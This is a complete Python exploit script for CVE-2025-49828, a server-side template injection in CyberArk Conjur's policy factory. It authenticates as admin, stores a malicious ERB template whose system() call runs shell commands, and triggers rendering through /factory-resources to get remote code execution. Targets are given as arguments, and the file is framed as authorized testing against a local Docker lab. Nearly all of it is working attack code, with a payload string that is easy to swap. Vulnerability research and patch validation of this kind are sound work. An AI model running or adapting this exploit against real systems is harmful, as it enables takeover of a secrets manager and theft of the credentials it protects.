#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CyberArk Conjur SSTI to RCE via ERB Policy Factory
# CVE            : CVE-2025-49828
# Vendor         : CyberArk (Open Source)
# Product        : Conjur OSS / Secrets Manager Self-Hosted
# Affected       : Conjur OSS 1.20.1–1.21.1, SM-SH 13.1–13.4.1
# Type           : CWE-1336 - Improper Neutralization of Template Engine Elements
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-49828 — Vector 1: SSTI via 'policy' field (POST)

Demonstrates Server-Side Template Injection (SSTI) in CyberArk Conjur OSS v1.20.1–v1.21.1.
The Factories::Renderer class uses Ruby ERB as its template engine, allowing arbitrary Ruby
code execution when a malicious factory template is invoked via /factory-resources.

ATTACK CHAIN:
  1. Authenticate as admin via Conjur API
  2. Create a factory variable via policy load
  3. Store a malicious ERB template with system() call in the 'policy' field
  4. Trigger factory rendering via POST /factory-resources → RCE as root

PREREQUISITES:
  - Docker with cve-2025-49828-vulnerable container running
  - Valid Conjur API key (auto-read from bind-mounted path, or provided as arg)
  - No external dependencies (stdlib only)

REFERENCES:
  - CVE-2025-49828
  - https://github.com/cyberark/conjur/security/advisories/GHSA-93hx-v9pv-qrm4
"""

import sys
import json
import base64
import os
import time
import urllib.request
import urllib.error
import urllib.parse

# =============================================================================
# Configuration
# =============================================================================
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 3000
ACCOUNT = "cucumber"
USERNAME = "admin"

# Paths relative to this script (bind-mounted into container at /opt/poc)
POC_DIR = os.path.dirname(os.path.abspath(__file__))
API_KEY_FILE = os.path.join(POC_DIR, ".api_key")
EVIDENCE_FILENAME = "evidence-v1.txt"
RCE_EVIDENCE_FILE_CONTAINER = f"/opt/poc/{EVIDENCE_FILENAME}"
RCE_EVIDENCE_FILE_LOCAL = os.path.join(POC_DIR, EVIDENCE_FILENAME)

# =============================================================================
# Helpers
# =============================================================================

def log(msg):
    print(f"[*] {msg}")

def success(msg):
    print(f"[+] {msg}")

def error(msg):
    print(f"[-] {msg}")

def http_request(url, method="GET", data=None, headers=None, timeout=15):
    """Perform an HTTP request using urllib (stdlib only)."""
    if headers is None:
        headers = {}
    if isinstance(data, str):
        data = data.encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except urllib.error.URLError as e:
        error(f"Connection error: {e.reason}")
        return None, str(e.reason)

def get_api_key():
    """Read the admin API key from bind-mounted file."""
    try:
        with open(API_KEY_FILE, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        error(f"API key file not found at {API_KEY_FILE}")
        error("Ensure the lab is running (docker compose up -d) and entrypoint has completed.")
        return None

def check_evidence_file():
    """Check if the RCE evidence file exists on the local filesystem (via bind mount)."""
    try:
        with open(RCE_EVIDENCE_FILE_LOCAL, "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

def clean_evidence_file():
    """Remove the RCE evidence file (local filesystem via bind mount)."""
    try:
        os.remove(RCE_EVIDENCE_FILE_LOCAL)
    except FileNotFoundError:
        pass

# =============================================================================
# Exploit Steps
# =============================================================================

def authenticate(base_url, api_key):
    """
    Step 1: Exchange the admin API key for a short-lived access token.
    Conjur auth: POST /authn/{account}/{login}/authenticate with API key as body.
    Returns a Base64-encoded Slosilo-signed token for use in Authorization header.
    """
    log(f"Authenticating as '{USERNAME}' to {base_url}...")
    url = f"{base_url}/authn/{ACCOUNT}/{USERNAME}/authenticate"
    status, body = http_request(url, method="POST", data=api_key)
    if status != 200:
        error(f"Authentication failed (HTTP {status}): {body}")
        return None

    # Base64-encode the JSON token for use in header
    token = base64.b64encode(body.encode("utf-8")).decode("utf-8")
    success(f"Authenticated successfully. Token length: {len(token)}")
    return token

def auth_header(token):
    """Build the Authorization header for Conjur API requests."""
    return {"Authorization": f'Token token="{token}"'}

def load_factory_policy(base_url, token):
    """
    Step 2: Load the policy that creates the factory variable resource.
    This creates the variable at 'conjur/factories/core/v1/evil' which will
    hold our malicious factory template.
    """
    log("Loading factory infrastructure policy...")
    policy = """- !policy
  id: conjur
  body:
  - !policy
    id: factories
    body:
    - !policy
      id: core
      body:
      - !variable v1/evil
"""
    url = f"{base_url}/policies/{ACCOUNT}/policy/root"
    headers = auth_header(token)
    headers["Content-Type"] = "text/plain"
    status, body = http_request(url, method="POST", data=policy, headers=headers)
    if status in (200, 201):
        success(f"Factory policy loaded (HTTP {status})")
        return True
    else:
        error(f"Failed to load policy (HTTP {status}): {body}")
        return False

def store_malicious_factory(base_url, token):
    """
    Step 3: Create and store the malicious factory template.

    The factory template is a JSON object with:
      - version: factory version string
      - policy: Base64-encoded ERB template (the SSTI payload lives here)
      - policy_branch: ERB template for branch path (plain text)
      - schema: JSON Schema for request body validation

    The entire JSON is Base64-encoded and stored as the value of the Conjur
    variable at 'conjur/factories/core/v1/evil'.

    The ERB payload in 'policy' will execute:
      system('id > /opt/poc/evidence-v1.txt && hostname >> ...')
    """
    log("Constructing malicious factory template with ERB SSTI payload...")

    # The ERB payload that will execute arbitrary commands
    rce_command = f"id > {RCE_EVIDENCE_FILE_CONTAINER} && hostname >> {RCE_EVIDENCE_FILE_CONTAINER} && echo CVE-2025-49828-EXPLOITED >> {RCE_EVIDENCE_FILE_CONTAINER}"
    malicious_policy_erb = f"<%= system('{rce_command}') %>\n- !policy\n  id: <%- id -%>"

    log(f"  ERB payload: <%= system('{rce_command}') %>")

    # Base64-encode the policy template (factory format requires this)
    policy_b64 = base64.b64encode(malicious_policy_erb.encode("utf-8")).decode("utf-8")

    # Build the factory JSON structure
    factory = {
        "version": "v1",
        "policy": policy_b64,
        "policy_branch": "<%= branch %>",
        "schema": {
            "$schema": "http://json-schema.org/draft-06/schema#",
            "title": "Evil Factory",
            "type": "object",
            "properties": {
                "id": {"type": "string"},
                "branch": {"type": "string"}
            },
            "required": ["branch", "id"]
        }
    }

    # Base64-encode the entire factory JSON (Conjur's storage format)
    factory_json = json.dumps(factory)
    factory_b64 = base64.b64encode(factory_json.encode("utf-8")).decode("utf-8")

    log(f"  Factory JSON size: {len(factory_json)} bytes")
    log(f"  Encoded factory size: {len(factory_b64)} bytes")

    # Store as a Conjur secret variable value
    variable_id = urllib.parse.quote("conjur/factories/core/v1/evil", safe="")
    url = f"{base_url}/secrets/{ACCOUNT}/variable/{variable_id}"
    headers = auth_header(token)

    status, body = http_request(url, method="POST", data=factory_b64, headers=headers)
    if status in (200, 201):
        success("Malicious factory template stored successfully")
        return True
    else:
        error(f"Failed to store factory (HTTP {status}): {body}")
        return False

def trigger_factory(base_url, token):
    """
    Step 4: Trigger the factory rendering via POST /factory-resources.

    When the factory-resources endpoint is called, Conjur:
      1. Loads the factory template from the database
      2. Decodes the Base64 JSON → extracts 'policy' and 'policy_branch'
      3. Renders 'policy_branch' through ERB (first SSTI opportunity)
      4. Decodes and renders 'policy' through ERB (second SSTI opportunity — our payload)
      5. ERB.new(template).result_with_hash(variables) evaluates the <%= %> tags
      6. system() call executes → RCE achieved

    The response may be an error (since our malicious template produces invalid
    policy YAML), but the code execution happens BEFORE policy parsing.
    """
    log("Triggering factory rendering (this executes the ERB payload)...")

    url = f"{base_url}/factory-resources/{ACCOUNT}/core/v1/evil"
    headers = auth_header(token)
    headers["Content-Type"] = "application/json"
    payload = json.dumps({"id": "pwned", "branch": "root"})

    status, body = http_request(url, method="POST", data=payload, headers=headers)
    log(f"  Factory response: HTTP {status}")
    if body:
        # Truncate long responses
        display = body[:500] + "..." if len(body) > 500 else body
        log(f"  Response body: {display}")

    # The HTTP response code doesn't matter — what matters is whether the
    # ERB payload executed. The response will likely be an error because
    # our malicious template produces 'true\n- !policy...' which is not
    # valid Conjur policy YAML. But the system() call runs first.
    return True

def verify_rce():
    """
    Step 5: Verify that the RCE payload executed by checking for the evidence file.
    """
    log(f"Checking for RCE evidence file ({EVIDENCE_FILENAME})...")
    time.sleep(1)  # Brief pause for filesystem sync

    content = check_evidence_file()
    if content:
        success("=" * 60)
        success("RCE CONFIRMED! Contents of evidence file:")
        success("=" * 60)
        for line in content.split("\n"):
            success(f"  {line}")
        success("=" * 60)
        return True
    else:
        error(f"Evidence file {EVIDENCE_FILENAME} not found")
        error("RCE may have failed — check container logs")
        return False

# =============================================================================
# Main exploit orchestration
# =============================================================================

def exploit(target_host, target_port, api_key=None):
    """Run the full exploit chain against the target Conjur instance."""
    base_url = f"http://{target_host}:{target_port}"
    log(f"Target: {base_url}")
    log(f"CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory")
    log(f"Vector: Malicious ERB payload in factory 'policy' field")
    print()

    # Get API key if not provided
    if not api_key:
        log("Reading API key from bind-mounted path...")
        api_key = get_api_key()
        if not api_key:
            error("Could not obtain API key. Provide it as the third argument.")
            return False
        success(f"Got API key: {api_key[:8]}...{api_key[-4:]}")
    print()

    # Clean up any previous evidence
    clean_evidence_file()

    # Step 1: Authenticate
    token = authenticate(base_url, api_key)
    if not token:
        return False
    print()

    # Step 2: Load factory infrastructure policy
    if not load_factory_policy(base_url, token):
        return False
    print()

    # Step 3: Store malicious factory template
    if not store_malicious_factory(base_url, token):
        return False
    print()

    # Step 4: Trigger the factory rendering (RCE happens here)
    trigger_factory(base_url, token)
    print()

    # Step 5: Verify RCE
    rce_confirmed = verify_rce()
    print()

    if rce_confirmed:
        success("EXPLOIT SUCCESSFUL — CVE-2025-49828 CONFIRMED")
        success(f"Arbitrary command execution demonstrated on {base_url}")
        success("The Conjur server evaluated attacker-controlled ERB template code")
        return True
    else:
        error("EXPLOIT FAILED — could not confirm RCE")
        error("Check Conjur container logs for debugging")
        return False

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    key = sys.argv[3] if len(sys.argv) > 3 else None

    result = exploit(target, port, key)
    sys.exit(0 if result else 1)
